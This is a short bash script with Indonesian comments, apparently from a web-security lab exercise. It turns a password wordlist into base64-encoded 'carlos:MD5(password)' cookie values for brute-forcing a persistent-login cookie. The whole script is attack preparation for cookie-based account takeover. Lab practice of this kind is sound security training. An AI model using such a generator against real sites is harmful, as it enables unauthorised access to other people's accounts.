while read -r p; do
    # 1. Ambil password, ubah ke MD5 hash (tanpa newline)
    md5=$(echo -n "$p" | md5sum | awk '{print $1}')
    # 2. Gabungkan jadi carlos:md5hash, lalu encode ke Base64
    cookie=$(echo -n "carlos:$md5" | base64 | tr -d '\n')
    # 3. Masukkan ke file wordlist baru
    echo "$cookie" >> /tmp/CCS.txt
done < PS-wordlists/password/PS-P-L.lst
